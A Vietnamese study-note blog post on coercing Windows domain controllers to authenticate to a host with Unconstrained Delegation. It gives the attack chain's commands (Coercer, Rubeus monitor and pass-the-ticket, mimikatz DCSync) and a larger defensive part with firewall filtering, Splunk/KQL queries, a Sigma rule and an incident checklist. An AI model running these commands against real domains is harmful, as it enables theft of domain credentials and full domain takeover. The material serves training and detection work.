---
layout: post
title: "Coercing Attacks & Unconstrained Delegation"
date: 2026-07-13 22:54:24 +0700
categories: ["Windows Attacks & Defense", "Windows Internals & Authentication"]
tags: [active-directory, windows-attacks-defense, coercer, coerced-authentication, unconstrained-delegation, rubeus, mimikatz, dcsync, kerberos, tgt, rpc, smb, firewall, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Tóm tắt Coercing Attacks & Unconstrained Delegation: ép Domain Controller xác thực tới host có Unconstrained Delegation, thu TGT, abuse DCSync, prevention bằng RPC firewall và outbound SMB filtering."
toc: true
---

# Coercing Attacks & Unconstrained Delegation

Bài này thuộc module **Windows Attacks & Defense**, tập trung vào việc lạm dụng các RPC functions để ép máy từ xa xác thực tới host do attacker kiểm soát, sau đó tận dụng **Unconstrained Delegation** để thu TGT.

```text
Mục tiêu: hiểu coerced authentication, Unconstrained Delegation,
Rubeus TGT monitoring, Coercer, DCSync follow-up và detection qua firewall/network logs.
```

> Chỉ thực hành trong HTB, lab hoặc hệ thống có ủy quyền rõ ràng. Không ép xác thực, thu ticket hoặc thực hiện DCSync ngoài phạm vi được phép.

---

## Timeline cập nhật

```text
Created at: 2026-07-13 22:54:24 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Windows Attacks & Defense
Section: Coercing Attacks & Unconstrained Delegation
Focus: RPC coercion, Coercer, Rubeus, TGT capture, DCSync, firewall detection
```

---

# 1. Coercing Attack là gì?

Coercing attack ép một máy Windows xác thực tới một host khác thông qua RPC.

Flow tổng quát:

```text
1. Attacker gọi RPC function dễ bị abuse.
2. Target machine kết nối ngược tới listener.
3. Target gửi authentication material.
4. Attacker relay hoặc tận dụng ticket được cache.
```

PrinterBug chỉ là một trong nhiều kỹ thuật coercion. Công cụ **Coercer** kiểm thử nhiều RPC functions/protocols cùng lúc.

---

# 2. Các follow-up attack phổ biến

Sau khi ép được máy mục tiêu xác thực, attacker có thể:

- Relay tới DC khác để DCSync.
- Ép DC xác thực tới host có Unconstrained Delegation.
- Relay tới AD CS để lấy certificate.
- Relay để cấu hình Resource-Based Constrained Delegation.
- Relay sang SMB/LDAP/HTTP tùy điều kiện.

---

# 3. Unconstrained Delegation là gì?

Unconstrained Delegation cho phép service/computer nhận và cache TGT của user/machine kết nối tới nó.

Nếu attacker có local admin trên host có UD:

```text
TGT được cache trong memory có thể bị export.
```

Điều này cực kỳ nguy hiểm nếu Domain Controller bị ép xác thực tới host UD.

---

# 4. Enumerate Unconstrained Delegation

Dùng PowerView trong lab:

```powershell
Get-NetComputer -Unconstrained |
Select-Object samaccountname
```

Ví dụ:

```text
DC1$
SERVER01$
WS001$
DC2$
```

Domain Controllers thường trusted for delegation theo mặc định; workstation/server khác xuất hiện trong danh sách cần được review kỹ.

---

# 5. Rubeus Monitor

Trên host UD đã bị compromise và attacker có admin:

```powershell
.\Rubeus.exe monitor /interval:1
```

Rubeus sẽ theo dõi ticket cache và phát hiện TGT mới.

Thông tin quan trọng:

- User/computer account.
- StartTime.
- EndTime.
- RenewTill.
- Ticket flags.
- Base64 ticket.

---

# 6. Trigger bằng Coercer

Ví dụ trong lab:

```bash
Coercer   -u <DOMAIN_USER>   -p '<PASSWORD>'   -d <DOMAIN>   -l <UD_HOST>   -t <TARGET_DC>
```

Coercer sẽ thử nhiều RPC methods như:

- MS-EFSR.
- MS-DFSNM.
- MS-RPRN.
- Các named pipes liên quan.

Output như:

```text
ERROR_BAD_NETPATH (Attack has worked!)
rpc_s_access_denied (Attack should have worked!)
```

có thể vẫn nghĩa là coerced authentication đã được trigger.

---

# 7. Thu TGT của Domain Controller

Nếu attack thành công, Rubeus trên host UD có thể thấy:

```text
User: DC1$@EAGLE.LOCAL
Flags: forwarded, forwardable, renewable
Base64EncodedTicket: ...
```

Đây là TGT của computer account Domain Controller.

```text
TGT của DC là credential material cấp Tier-0.
```

---

# 8. Import Ticket

Trong lab:

```powershell
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

Kiểm tra:

```powershell
klist
```

Ticket mong đợi:

```text
Client: DC1$ @ EAGLE.LOCAL
Server: krbtgt/EAGLE.LOCAL @ EAGLE.LOCAL
```

---

# 9. Follow-up: DCSync

Sau khi import TGT của DC account, attacker có thể thực hiện DCSync trong lab:

```text
lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>
```

Đây là lý do coerced authentication kết hợp UD có thể dẫn tới full domain compromise.

---

# 10. Vì sao attack nguy hiểm?

Attack chain:

```text
Low-privileged domain user
        ↓
RPC coercion
        ↓
DC authenticates to UD host
        ↓
TGT cached
        ↓
Rubeus exports TGT
        ↓
Pass-the-Ticket
        ↓
DCSync
```

Một user domain thấp quyền có thể leo lên Domain Admin nếu môi trường có:

- Coercion exposure.
- Host UD bị compromise.
- Thiếu network egress control.
- Tier-0 server được phép outbound SMB tùy ý.

---

# 11. Prevention

Không có cơ chế Windows mặc định đủ granular để chặn từng RPC opnum nguy hiểm.

Hai hướng chính:

## RPC Firewall

Dùng third-party RPC firewall để:

- Audit RPC calls.
- Chặn opnum nguy hiểm.
- Allowlist legitimate functions.
- Theo dõi protocol abuse.

## Outbound SMB Filtering

Chặn Domain Controllers và core servers kết nối outbound tới:

```text
TCP 139
TCP 445
```

Ngoại lệ:

- DC-to-DC.
- File/backup systems hợp lệ.
- Business-required systems.

---

# 12. Vì sao outbound filtering hiệu quả?

Coercion thường cần target kết nối ngược tới attacker.

Nếu outbound 139/445 bị chặn:

```text
RPC trigger có thể thành công
nhưng reverse connection bị firewall drop
attacker không nhận được TGT/authentication
```

Nên chặn cả `139` và `445` vì Windows có thể fallback.

---

# 13. Detection bằng Firewall Logs

Pattern thường thấy:

```text
Nhiều inbound RPC connections tới DC
        ↓
DC tạo outbound SMB connection tới attacker IP
        ↓
Quá trình lặp lại nhiều lần
```

Nếu outbound bị block:

```text
ALLOW inbound RPC
DROP outbound TCP/445 hoặc TCP/139
```

Đây là high-value signal.

---

# 14. Windows Firewall Logging

Bật log dropped/allowed connections:

```powershell
Set-NetFirewallProfile -Profile Domain,Private,Public `
  -LogAllowed True `
  -LogBlocked True `
  -LogFileName "%systemroot%\system32\LogFiles\Firewall\pfirewall.log"
```

Kiểm tra:

```powershell
Get-NetFirewallProfile |
Select-Object Name, LogAllowed, LogBlocked, LogFileName
```

---

# 15. Splunk Detection

Ví dụ ingest firewall logs:

```spl
index=windows_firewall
(dest_port=445 OR dest_port=139)
action=blocked
| stats count values(dest_ip) as destinations by src_ip, host
| sort - count
```

Tier-0 server outbound SMB:

```spl
index=windows_firewall
(src_role="Domain Controller")
(dest_port=445 OR dest_port=139)
| where dest_role!="Domain Controller"
| stats count values(action) as actions values(dest_ip) as destinations by host
```

---

# 16. ELK/KQL

```kql
destination.port: (139 or 445)
and network.direction: "egress"
and source.domain: "tier0"
```

Blocked outbound:

```kql
destination.port: (139 or 445)
and event.action: "blocked"
and host.name: "DC1"
```

---

# 17. Sigma-like Detection Concept

Firewall-oriented Sigma rule:

```yaml
title: Tier-0 Server Outbound SMB To Unexpected Host
status: experimental
logsource:
  product: windows
  service: firewall
detection:
  selection:
    DestinationPort:
      - 139
      - 445
  condition: selection
falsepositives:
  - Domain Controller replication
  - Approved backup or file-server communication
level: high
```

Cần thêm asset context trong SIEM.

---

# 18. Network Hunting

Nguồn telemetry nên dùng:

- Windows Firewall.
- Zeek.
- Suricata.
- NetFlow.
- EDR network events.
- RPC Firewall logs.

Hunt theo:

```text
DC → workstation TCP/445
DC → unknown host TCP/139
Nhiều RPC calls rồi SMB egress
One source coercing multiple servers
Repeated failed outbound SMB
```

---

# 19. Correlation với Windows Events

Nên correlate:

```text
4624 - Successful logon
4662 - DCSync/Directory replication
4768 - TGT request
4769 - Service ticket request
4688 - Process execution
```

Attack chain có thể biểu hiện:

```text
Firewall: DC outbound 445 tới host lạ
        ↓
Rubeus process trên UD host
        ↓
Ticket use
        ↓
4662 hoặc abnormal LDAP replication
```

---

# 20. Threat Hunting

Hunt theo:

- Computer không phải DC có Unconstrained Delegation.
- Admin logon trên UD host.
- Rubeus `monitor`.
- DC computer account ticket trên non-DC host.
- Tier-0 outbound SMB.
- Coercer/Dementor command line.
- DCSync sau coercion.

---

# 21. Incident Response Checklist

```text
[ ] Xác định target bị coercion.
[ ] Xác định attacker/listener IP.
[ ] Kiểm tra outbound 139/445.
[ ] Xác định host có Unconstrained Delegation.
[ ] Kiểm tra ai có local admin trên host UD.
[ ] Hunt Rubeus/Mimikatz artifacts.
[ ] Kiểm tra ticket cache.
[ ] Review 4624, 4662, 4768, 4769.
[ ] Rotate affected machine/user credentials.
[ ] Remove Unconstrained Delegation nếu không cần.
[ ] Block outbound SMB từ Tier-0.
[ ] Hunt DCSync và lateral movement.
```

---

# 22. Mapping với CDSA

## Security Operations & Monitoring

- Collect firewall logs.
- Monitor DC outbound SMB.
- Baseline Tier-0 network flows.
- Alert unexpected RPC + SMB pattern.

## Incident Response & Forensics

- Triage UD host.
- Dump memory nếu cần.
- Phân tích ticket cache.
- Tìm Rubeus/Mimikatz process artifacts.
- Xác định credential exposure scope.

## Threat Hunting

- Hunt UD-enabled non-DC systems.
- Hunt machine-account TGT trên workstation.
- Hunt coerced SMB egress.
- Hunt DCSync after network anomaly.

## Detection Engineering

- Sigma/Elastic/Splunk rule cho outbound SMB.
- CMDB enrichment cho Tier-0 assets.
- Correlate firewall + Windows Security + Sysmon.
- SOAR playbook isolate UD host.

---

# 23. Lab Setup

Môi trường tối thiểu:

```text
1 Domain Controller
1 host có Unconstrained Delegation
1 Windows workstation
1 Linux attack host
1 Splunk/ELK/Wazuh server
Firewall/Zeek/Suricata visibility
```

Log nên thu:

```text
Windows Firewall logs
Security: 4624, 4662, 4768, 4769, 4688
Sysmon: 1, 3, 10
PowerShell Operational
Zeek SMB/RPC logs
```

---

# Key Takeaway

```text
Coercing attacks ép remote machine xác thực tới attacker-selected host.
Unconstrained Delegation làm TGT bị cache trên server.
Nếu DC bị ép xác thực tới host UD bị compromise, attacker có thể lấy DC TGT.
Prevention hiệu quả nhất là loại bỏ UD không cần thiết và chặn outbound 139/445 từ Tier-0.
Detection trọng tâm là firewall/network correlation.
```

Coercing Attacks & Unconstrained Delegation là ví dụ điển hình của CDSA: một chuỗi attack kết hợp RPC, Kerberos, network control, endpoint telemetry và SIEM correlation.
